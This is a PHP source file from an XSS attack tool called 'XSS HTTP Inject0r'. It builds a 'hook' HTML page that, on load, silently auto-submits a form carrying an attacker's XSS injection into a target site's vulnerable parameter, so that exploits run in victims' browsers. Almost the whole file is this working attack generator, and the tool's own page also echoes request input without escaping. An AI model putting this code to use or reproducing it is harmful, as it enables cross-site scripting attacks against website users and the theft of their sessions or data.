<?php
$target = $_REQUEST["target"];
$vulnerability = $_REQUEST["vulnerability"];
$injection = $_REQUEST["injection"];
?>
<!doctype html><html itemscope="" itemtype="http://schema.org/WebPage" lang="en">
<head><title>XSS HTTP Inject0r!</title>
<meta http-equiv="content-type" content="text/html;charset=utf-8">
<link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
<style type="text/css">
<!--
body,td,th {
color: #FFFFFF;
}
body {
background-color: #000000;
}
a {
 color:lime;
}
-->
</style>
<script type="text/javascript">
function SetUrl(frm){
    var ip = "<?php echo $_SERVER['SERVER_NAME']; ?>";
    var dir = "<?php echo preg_replace("/\?.*$/","",str_replace("hooker.php", "Index.html", $_SERVER['REQUEST_URI'])); ?>";
    alert("HOOK's URL: " +ip+dir);
}
</script>
<?php
if(isset($_REQUEST['generate']))
{
  generate();
}
?>
</head>
<body>
<center>
<br />| <a href="https://github.com/epsylon/xss-http-injector" target="_blank">XSS HTTP Inject0r!</a> - 2014 - <a href="http://gplv3.fsf.org" target="_blank">GPLv3</a> |<br /><br />
<img src="images/pwned.jpg" width="350" height="203" border="1"><br />
'Hook' targets to execute XSS exploits on their browsers... |<a href="index.html">Back</a>|<br /><br />
<form method="POST" name="hook_frm">
<table border="1">
 <tr>
  <td>1-</td>
  <td>
   <table>
    <tr>
     <td><u>Target</u> (Url to target's form):</td><td><input type="text" name="target" value='<?php echo $target;?>' size="35" readonly></td>
    </tr>
    <tr>
     <td><u>Vulnerability</u> (Vulnerable parameter):</td><td><input type="text" name="vulnerability" value='<?php echo $vulnerability;?>' readonly></td>
    </tr>
    <tr>
     <td><u>Injection</u> (Code to inject):</td><td><textarea name="injection" cols="40" rows="1" readonly><?php echo ($injection);?></textarea></td>
    </tr>
    <tr>
     <td><u>Method</u> (GET/POST):</td><td><input type="text" name="method" value='<?php echo $_REQUEST["method"];?>' readonly></td>
    </tr>
   </table>
  </td>
 </tr>
 <tr>
  <td>2-</td>
  <td>
   <table>
    <tr>
     <td><u>File</u>:</td><td>Index.html</td>
    </tr>
   </table>
  </td>
 </tr>
 <tr>
  <td>3-</td><td><center><br /><input type="submit" value="Generate Hook!" name="generate" onclick="javascript:SetUrl();" style="padding: 10px; font-weight:bold;"><br /><br /></center></td>
 </tr>
</table>
</form>
<?php
function generate()
{
$target = $_REQUEST["target"];
$vulnerability = $_REQUEST["vulnerability"];
$injection = utf8_decode($_REQUEST["injection"]);
$injection = htmlentities($injection, ENT_QUOTES);
$sHTML_Header = "<html><head><title></title><meta http-equiv='content-type' content='text/html;charset=utf-8'><script>function xss(){document.f.s.click();}</script></head>";
$sHTML_Content = "<body onload='xss();'><form method='".$_REQUEST['method']."' name='f' action='$target'><input name='$vulnerability' value='$injection'><input type='submit' name='s'></form>";
$sHTML_Footer =  "</body></html>";
$filename = "Index.html"; // this is the filename of the archive ('hook') generated on your server.
if (is_writable($filename)) {
   IF (!$handle = fopen($filename, 'w')) {
         echo "Cannot open file ($filename)";
         exit;
   }
   if (fwrite($handle, $sHTML_Header) === FALSE) {
       echo "Cannot write to file ($filename)";
       exit;
   }else{
      fwrite($handle, $sHTML_Content);
      fwrite($handle, $sHTML_Footer);
   }
   fclose($handle);
}else{
   echo "The file $filename is not writable (use: chown www-data:www-data $filename)";
}
}
?>
</center>
</body>
</html>
